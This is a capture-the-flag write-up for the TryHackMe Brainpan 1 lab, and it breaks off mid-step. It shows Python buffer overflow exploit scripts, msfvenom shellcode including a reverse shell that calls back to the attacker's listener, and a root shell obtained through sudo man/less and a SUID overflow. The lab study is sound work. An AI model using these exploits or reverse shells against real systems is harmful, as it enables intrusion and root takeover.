---
title: "Brainpan 1"
---

:::info

Description: This is a write-up for the [Brainpan 1 Room](https://tryhackme.com/room/brainpan) on TryHackMe. 

Credits: S/o to SnoOw, Hunterbot, Tedd and Kafka's help on this box!

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Linux &#xf17c;|OSCP|&#xf058; &#xf058; &#xf058; &#xf058;|

:::

## RECON

First, as always, recon to see what's open

### scan

Port scanning to see what's open -- let's use `threader3000` for speed

Using dievus' [threader3000](https://github.com/dievus/threader3000) multi-threaded python port scanner with Nmap integration to scan the brainpan box:

```bash
------------------------------------------------------------   [31/31]
        Threader 3000 - Multi-threaded Port Scanner                                                                 
                       Version 1.0.7                                                                                
                   A project by The Mayor                                                                           
------------------------------------------------------------                                                        
Enter your target IP address or URL here: 10.10.5.188                                                               
------------------------------------------------------------                                                        
Scanning target 10.10.5.188                                                                                         
Time started: 2022-03-08 20:49:07.183965                                                                            
------------------------------------------------------------                                                        
Port 9999 is open                                                                                                   
Port 10000 is open                                                                                                  
Port scan completed in 0:01:32.890425                                                                               
------------------------------------------------------------                                                        
Threader3000 recommends the following Nmap scan:                                                                    
************************************************************                                                        
nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188                                                       
************************************************************                                                        
Would you like to run Nmap or quit to terminal?                                                                     
------------------------------------------------------------                                                        
1 = Run suggested Nmap scan                                                                                         
2 = Run another Threader3000 scan                                                                                   
3 = Exit to terminal                                                                                                
------------------------------------------------------------                                                        
Option Selection: 1                                                                                                 
nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188                                                       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 20:51 NZDT                                                    
Nmap scan report for 10.10.5.188                                                                                    
Host is up (0.28s latency).                                                                                         
                                                                                                                    
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=3/8%Time=62270AEC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.21 seconds
------------------------------------------------------------
Combined scan completed in 0:02:54.620378
Press enter to quit...
```

We can see the following open ports:

```bash
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

### enumerate

Looks like a web server running on port `10000`, I use `gobuster` to enumerate possible directories on the server and found:

```bash
http://10.10.5.188:10000/bin                  (Status: 301) [Size: 0] [--> /bin/]
http://10.10.5.188:10000/index.html           (Status: 200) [Size: 215]

```

Open browser to `http://$TARGET_IP:10000/bin` and found `brainpan.exe` application.

I download the .exe and proceed to setup a buffer overflow local development environment on my Windows7 VM.

## EXPLOIT

I setup the usual environment in my Windows 7 VM (ip=172.16.2.125)

* immunity debugger
* mona python modules
* copy of `brainpan.exe` to run

### offset

Using Noodles offset short cut method, I quickly find the buffer offset for my payload:

Create an offset pattern for my script:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700
```

Use this as payload in my `offset.py` script:

```python title="offset.py"
#!/usr/bin/env python3

import socket

ip = "172.16.2.125"
port = 9999

offset = 0 
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A......"
postfix = ""

buffer = overflow + retn + padding + payload + postfix

print("buffer=",len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(payload + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Fire this payload at my Win7 box, `./offset.py`.

When Immunity Debugger crashes, read the value from `EIP` register e.g. `35724134`

Use metasploit `pattern_offset` to find this pattern in the string from before:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 35724134
 [*] Exact match at offset 524
```

The offset is `524`.

To verify this, use the following `eip.py` script to get 4 x B's (i.e. `0x42424242`) written to the EIP:

```python title="eip.py"
#!/usr/bin/env python3

import socket

ip = "172.16.2.125"
port = 9999

offset = 524
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

print("buffer=",len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("buffer size:", len(buffer))
  print("Crash Overwrite EIP: 42424242...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

If you did everything right, there will be `0x42424242` (i.e. 4 x B's) in the EIP.

### bad chars

Do a quick check of bad characters to avoid in your shellcode.

Set mona work dir: `!mona config -set workingfolder C:\Users\IEUser\Downloads\%p`

Let's use mona to create our byte array and test for bad chars starting with the nullbyte array: `!mona bytearray -b "\x00"`

Use our script `badchar.py` to send the payload:

```python title="badchar.py"
#!/usr/bin/env python3

import socket

ip = "172.16.2.125"
port = 9999

offset = 524
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = overflow + retn + payload

print("buffer=",len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Looking for badchars...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

When the application crashes, use mona to compare the generated saved byte array with the value of the bytearray starting from the $ESP address (`-a <ESP-value>`):

`!mona compare -f C:\Users\IEUser\Downloads\chatserver\bytearray.bin -a 0022F930`

Got unmodified status! This means the only bad char is the nullbyte (`"\x00"`).

### return jmp esp address

Run this mona command in Immunity Debugger to find a `jmp` address to use: `!mona jmp -r esp -cpb "\x00"`

Looks like we only have 1 x address to choose from:

```bash
Log data, item 3
 Address=311712F3
 Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\brainpan.exe)
```

return address = `0x311712f3` = little endian = `\xf3\x12\x17\x31`.

We have our return address, now it's time to create our (reverse shell) shellcode.

### shellcode

:::tip the right shellcode?

I spent a lot of time on the PRIVESC part not being able to pop root _because_ I was using a `windows_reverse_tcp` shell which connects successfully, but the behaviour of the commands I ran in that shell failed to get me root, whereas the same commands in the "correct" shell got me root immediately.

:::

The box is running Linux but the service is a Win32 executable run using WINE, while a windows_reverse_tcp shell connects successfully, I will document the process that got root successfully, starting with the right shell.

Thanks to tedd from the stream for figuring out the linux reverse shell to use which got us root.

Let's create the following linux reverse shell:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\x00" -f c -e x86/shikata_ga_nai
```

Add it to our payload and run:

```python title="thm-linux.py"
#!/usr/bin/env python3

import socket

ip = "10.10.94.62"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31" # found using mona
padding = "\x90" * 16
payload = (
"\xdb\xd8\xd9\x74\x24\xf4\x5a\xbe\x69\xb2\xd7\x92\x2b\xc9\xb1"
"\x12\x31\x72\x17\x03\x72\x17\x83\xab\xb6\x35\x67\x1a\x6c\x4e"
"\x6b\x0f\xd1\xe2\x06\xad\x5c\xe5\x67\xd7\x93\x66\x14\x4e\x9c"
"\x58\xd6\xf0\x95\xdf\x11\x98\x2f\x2b\xd5\x0b\x58\x29\x19\xab"
"\xc8\xa4\xf8\x1b\x8e\xe6\xab\x08\xfc\x04\xc5\x4f\xcf\x8b\x87"
"\xe7\xbe\xa4\x54\x9f\x56\x94\xb5\x3d\xce\x63\x2a\x93\x43\xfd"
"\x4c\xa3\x6f\x30\x0e"
)
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("buffer size:", len(buffer))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Setup listener on attack machine: `sudo rlwrap nc -lnvp 80`

Send payload `./thm-linux.py`

Success:

```bash
└─$ sudo rlwrap nc -lnvp 80                                                                                     1 ⨯
listening on [any] 80 ...
connect to [10.11.55.83] from (UNKNOWN) [10.10.73.41] 42786
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ 
```

:::info upgrade your shell

* Find python on the box: `which python3`
* Upgrade your shell: `/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'`

:::

## PRIVESC

There are (supposedly) two routes to root: sudo, and a suid binary on the box. Let's look at both.

### method 1: sudo

Once we have our upgraded shell, we try out `sudo -l` to see what we can see:

```bash
sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$
```

So we have a command we can run as root, with no password required.

When I run that command `sudo /home/anansi/bin/anansi_util`, I get this:

```bash
sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
```

The `manual [command]` looks the most interesting because we get to feed it input.

Long story short, it runs the `man` command and gives us a manual page based on a keyword we give it. Myself, along with the collective skills of my Twitch chat crew, we deduce that we will try and pop a shell from inside the `less` output that `man` gives i.e. we try and enter `!/bin/bash` from inside the `man` output (which is running as `sudo`) and essentially will be `root` running the shell command.

```bash
sudo /home/anansi/bin/anansi_util manual id
sudo /home/anansi/bin/anansi_util manual id
No manual entry for manual
WARNING: terminal is not fully functional
!/bin/bash
!/bin/bash
root@brainpan:/usr/share/man#
```

Congratulations. We have root.

### method 2: suid binary

After initial access to the box, I did `find . -perm /4000` and (I think it was kafka?) saw `/usr/local/bin/validate` in the results.

I copied the binary to shared web folder `/bin/cp validate /home/puck/web/bin` so I could download it to my local machine to work on it.

When I run it, it does the following:

```bash
└─$ ./validate     
usage ./validate <input>

└─$ ./validate 12345 
validating input...passed.
```

Looks like a possible buffer overflow situation.

Also, when I run strings on the binary, a few key words stand out:

```bash
strings validate                                                                                                
/lib/ld-linux.so.2                                                                                                  
__gmon_start__                                                                                                      
libc.so.6                                                                                                           
_IO_stdin_used                                                                                                      
strcpy # <-- we know this is vulnerable to overflow
validate                                                                                                            
main                                                                                                                
validate.c                                                                                                          
long long int                                                                                                       
unsigned char                                                                                                       
main                                                                                                                
/root/bin/brainpan # <-- running a binary as root?                                                                 
long long unsigned int
```

check some other info about the file:

```bash
$ file validate  
validate: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.15, BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, with debug_info, not stripped

$ binwalk validate 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)
```

I will use gdb on my local machine to develop the overflow payload.

Open the binary up in gdb:

```bash
$ gdb ./validate
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./validate...
(gdb) 
```

#### validate offset

Let's find the offset, create the pattern first:

```bash
┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120             
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
```

Feed this as input to our `./validate` program in gdb:

```bash
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'")
Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'")

Program received signal SIGSEGV, Segmentation fault.
0x39644138 in ?? ()
```

Query the return address in our `pattern_offset`, to find the offset:

```bash
┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 120 -q 39644138
[*] Exact match at offset 116
```

We now have our payload length which is the offset size: `116` bytes (don't include the return address 4 bytes).

:::info

All my own work after this point did not yield any results so from this point on I'm following this great write-up by [Interfence Security](https://resources.infosecinstitute.com/topic/brainpan_virtual_machine/) at infosecinstitute.

:::

#### validate payload

:::danger Further Understanding needed!

I don't understand why the payload is in the order it is i.e. why sometimes the NOP comes before shellcodes instead of after, when do we know we need alignment bytes? I need to find more understanding of what determines what in the payload.

:::

`payload = shellcode + NOP` (116 bytes) + `return_address` (4 bytes)

#### validate EIP

verify that we control the EIP

```bash
(gdb) run $(python -c "print 'A'*116 + 'B'*4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print 'A'*116 + 'B'*4")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

yes we can control the EIP.

#### validate return address

Find an instruction to `jmp` to our shellcode.

check what's in the registers:

```bash
(gdb) i r
eax            0xffffcf08          -12536
ecx            0xffffd2e0          -11552
edx            0xffffcf78          -12424
ebx            0x41414141          1094795585
esp            0xffffcf80          0xffffcf80
ebp            0x41414141          0x41414141
esi            0x2                 2
edi            0x8048400           134513664
eip            0x42424242          0x42424242
eflags         0x10286             [ PF SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/s $esp
0xffffcf80:     ""
(gdb) x/s $eip
0x42424242:     <error: Cannot access memory at address 0x42424242>
(gdb) x/s $eax
0xffffcf08:     'A' <repeats 116 times>, "BBBB"
```

note: `$esp` is pointing at nothing and `$eax` is pointing to our shellcode place-holders (i.e. the A's), so we use `$eax` to jump to our shellcode.

Let's see if there's a `jmp` instruction in the binary that can get us to the `eax` register:

```bash
┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
└─$ objdump -d validate | grep -i jmp
 8048382:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
 804838c:       ff 25 00 a0 04 08       jmp    *0x804a000
 8048397:       e9 e0 ff ff ff          jmp    804837c <.plt>
 804839c:       ff 25 04 a0 04 08       jmp    *0x804a004
 80483a7:       e9 d0 ff ff ff          jmp    804837c <.plt>
 80483ac:       ff 25 08 a0 04 08       jmp    *0x804a008
 80483b7:       e9 c0 ff ff ff          jmp    804837c <.plt>
 80483bc:       ff 25 0c a0 04 08       jmp    *0x804a00c
 80483c7:       e9 b0 ff ff ff          jmp    804837c <.plt>
 80483cc:       ff 25 10 a0 04 08       jmp    *0x804a010
 80483d7:       e9 a0 ff ff ff          jmp    804837c <.plt>
 80483dc:       ff 25 14 a0 04 08       jmp    *0x804a014
 80483e7:       e9 90 ff ff ff          jmp    804837c <.plt>
 80483ec:       ff 25 18 a0 04 08       jmp    *0x804a018
 80483f7:       e9 80 ff ff ff          jmp    804837c <.plt>
 80484cc:       eb 3a                   jmp    8048508 <validate+0x54>
 8048562:       eb 39                   jmp    804859d <main+0x65>
```

no `jmp` instructions. what about a `call` instruction?

```bash
┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
└─$ objdump -d validate| grep -i call
 8048353:       e8 00 00 00 00          call   8048358 <_init+0xc>
 8048369:       e8 1e 00 00 00          call   804838c <__gmon_start__@plt>
 804836e:       e8 1d 01 00 00          call   8048490 <frame_dummy>
 8048373:       e8 98 02 00 00          call   8048610 <__do_global_ctors_aux>
 804841c:       e8 7b ff ff ff          call   804839c <__libc_start_main@plt>
 8048468:       ff 14 85 14 9f 04 08    call   *0x8049f14(,%eax,4)
 80484af:       ff d0                   call   *%eax         # <--- here's one!
 80484f3:       e8 d4 fe ff ff          call   80483cc <printf@plt>
 80484ff:       e8 e8 fe ff ff          call   80483ec <exit@plt>
 8048511:       e8 96 fe ff ff          call   80483ac <strlen@plt>
 8048527:       e8 90 fe ff ff          call   80483bc <strcpy@plt>
 8048558:       e8 6f fe ff ff          call   80483cc <printf@plt>
 804856c:       e8 5b fe ff ff          call   80483cc <printf@plt>
 804857c:       e8 33 ff ff ff          call   80484b4 <validate>
 8048593:       e8 44 fe ff ff          call   80483dc <puts@plt>
 80485b6:       e8 4f 00 00 00          call   804860a <__i686.get_pc_thunk.bx>
 80485c4:       e8 83 fd ff ff          call   804834c <_init>
 80485f4:       ff 94 b3 18 ff ff ff    call   *-0xe8(%ebx,%esi,4)
 804862b:       ff d0                   call   *%eax         # <--- here's another!
 8048643:       e8 00 00 00 00          call   8048648 <_fini+0xc>
 804864f:       e8 dc fd ff ff          call   8048430 <__do_global_dtors_aux>
```

success! we have two instructions at memory address `80484af` and `804862b`.

I'm going to use the 2nd one: `804862b` (add a `0` at the start).

In little endian format, our return address = `\x2b\x86\x04\x08`.

#### validate shellcode

We already have a remote shell access to the box, so let's just spawn a new `/bin/sh` instance, this time with escalated privileges.

Let's use `msfvenom` to generate some shellcode.

```bash
└─$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=/bin/sh -b '\x00' -f c
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of c file: 319 bytes
unsigned char buf[] = 
"\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef"
"\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2"
"\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33"
"\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6";
```

check shellcode size with python:

```bash
└─$ python3                                                                     
Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> shell = (
... "\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
... "\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef"
... "\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2"
... "\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33"
... "\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6"
... )
>>> print(len(shell))
70
>>>
```

from our payload math above, we have this:

|payload|shellcode + NOP|return address|
|:---:|:---:|:---:|
|116 bytes| shellcode(70) + NOP (46)| 4 bytes|

our payload in full:

```bash
(gdb) run $(python -c "print ('\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x31\x68\x15\x83\xe8\xf
c\x03\x68\x11\xe2\xd9\x24\x74\xef\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2\xa5\x26\x68\x94\xc9\xea\
x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")                             
The program being debugged has been started already.                                                                  
Start it from the beginning? (y or n) y                                                                               
Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print ('\xbd\x2
c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef\xb8\
xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf
1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")                                        
validating input...passed.                                                                                            
[Inferior 1 (process 114848) exited normally]
```

:::danger Debug Payload

The payload kept "passing" and exiting normally. I re-checked the `python -c "print 'A' * 70 + 'B' * 46 + 'C' * 4"` to make sure a) the EIP was still under my control and b) it still crashes with this payload length.

After that I determined the shellcode was at fault and re-checked my badchars in the next section.

:::

#### correct overflow

Re-generate my shellcode, this time using the bad characters list `x00x0axff` from the write-up:

```bash
─$ msfvenom -p linux/x86/exec CMD=/bin/sh -b 'x00x0axff' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of c file: 319 bytes
unsigned char buf[] = 
"\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7"
"\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd"
"\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7"
"\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e";
```

check shellcode size again with python3:

```bash
└─$ python3
Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> shell = (
